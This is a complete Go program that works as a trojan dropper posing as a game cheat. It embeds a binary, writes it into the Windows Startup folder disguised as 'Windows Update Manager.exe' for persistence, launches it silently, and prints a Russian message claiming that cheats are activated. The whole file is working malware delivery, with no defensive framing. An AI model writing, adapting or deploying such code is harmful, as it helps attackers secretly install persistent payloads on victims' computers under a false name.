package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

//go:embed client.exe
var embeddedExe []byte

func main() {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return
	}
	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	targetPath := filepath.Join(startupPath, "Windows Update Manager.exe")
	err := os.WriteFile(targetPath, embeddedExe, 0755)
	if err != nil {
		return
	}
	cmd := exec.Command(targetPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	err = cmd.Start()
	if err != nil {
		return
	}
	cmd.Process.Release()
	fmt.Println("читы активированы хохохо")
}
